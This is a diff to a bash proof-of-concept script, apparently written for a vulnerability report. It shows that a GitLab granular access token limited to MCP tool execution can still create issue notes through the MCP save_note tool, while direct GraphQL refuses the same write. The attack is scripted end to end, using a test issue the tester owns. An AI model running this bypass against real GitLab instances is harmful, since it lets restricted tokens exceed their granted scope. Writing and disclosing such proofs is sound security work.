@@ -90,16 +90,58 @@ if [[ -z "$MCP_PATH" ]]; then
   MCP_PATH="$(jq -r '.result.content[0].text // empty' <<<"$MCP" 2>/dev/null | jq -r '.path_with_namespace // .fullPath // empty' 2>/dev/null || true)"
 fi
 
+echo "===== WRITE IMPACT SETUP: create one owned test issue ====="
+ISSUE_JSON="$(api "$ROOT_TOKEN" POST "/projects/$PROJECT_ID/issues" \
+  --data-urlencode "title=H1 MCP granular PAT write proof $STAMP")"
+printf '%s\n' "$ISSUE_JSON" >"$OUT/issue.json"
+ISSUE_ID="$(jq -r '.id' <<<"$ISSUE_JSON")"
+ISSUE_IID="$(jq -r '.iid' <<<"$ISSUE_JSON")"
+NOTE_BODY="H1 MCP GPAT write proof $STAMP"
+NOTEABLE_GID="gid://gitlab/Issue/$ISSUE_ID"
+
+echo "===== WRITE CONTROL: direct GraphQL with same GPAT must NOT create note ====="
+DIRECT_NOTE_BODY="$(jq -cn --arg id "$NOTEABLE_GID" --arg body "$NOTE_BODY" '{
+  query:"mutation($input: CreateNoteInput!) { createNote(input:$input) { note { id body } errors } }",
+  variables:{input:{noteableId:$id,body:$body}}
+}')"
+DIRECT_NOTE="$(curl -sS --fail-with-body \
+  -H "PRIVATE-TOKEN: $GPAT" -H 'Content-Type: application/json' \
+  --data-binary "$DIRECT_NOTE_BODY" "$BASE/api/graphql")"
+printf '%s\n' "$DIRECT_NOTE" | tee "$OUT/direct-graphql-create-note.json"
+
+if jq -e '.data.createNote.note != null' <<<"$DIRECT_NOTE" >/dev/null 2>&1; then
+  echo "ISOLATION_INVALID: direct GraphQL already created the note"
+  exit 23
+fi
+
+echo "===== WRITE EXPLOIT: same MCP-only GPAT calls save_note ====="
+MCP_NOTE_BODY="$(jq -cn --arg p "$PROJECT_PATH" --argjson iid "$ISSUE_IID" --arg body "$NOTE_BODY" '{
+  jsonrpc:"2.0",
+  id:"h1-2",
+  method:"tools/call",
+  params:{name:"save_note",arguments:{project_id:$p,work_item_iid:$iid,body:$body}}
+}')"
+MCP_NOTE="$(curl -sS --fail-with-body \
+  -H "PRIVATE-TOKEN: $GPAT" -H 'Content-Type: application/json' \
+  --data-binary "$MCP_NOTE_BODY" "$BASE/api/v4/mcp")"
+printf '%s\n' "$MCP_NOTE" | tee "$OUT/mcp-save-note.json"
+
+NOTES="$(api "$ROOT_TOKEN" GET "/projects/$PROJECT_ID/issues/$ISSUE_IID/notes")"
+printf '%s\n' "$NOTES" >"$OUT/notes-after.json"
+WRITE_COUNT="$(jq --arg body "$NOTE_BODY" '[.[] | select(.body == $body)] | length' <<<"$NOTES")"
+
 {
   echo "GitLab: 19.4.1-ee.0"
   echo "Project: $PROJECT_PATH"
   echo "Granular PAT scope: execute_mcp_tool @ user boundary only"
   echo "Direct GraphQL project result: $(jq -c '.data.project // null' <<<"$DIRECT")"
   echo "MCP returned project path: ${MCP_PATH:-<none>}"
+  echo "Direct GraphQL create-note result: $(jq -c '.data.createNote // null' <<<"$DIRECT_NOTE")"
+  echo "MCP-created matching note count: $WRITE_COUNT"
 } | tee "$OUT/summary.txt"
 
-if [[ "$MCP_PATH" == "$PROJECT_PATH" ]]; then
-  echo "H1_RESULT=PASS granular-token project scope bypass via MCP GraphQL tool" | tee -a "$OUT/summary.txt"
+if [[ "$MCP_PATH" == "$PROJECT_PATH" && "$WRITE_COUNT" -ge 1 ]]; then
+  echo "H1_RESULT=PASS granular-token read+write scope bypass via MCP GraphQL tools" | tee -a "$OUT/summary.txt"
   exit 0
 fi
 
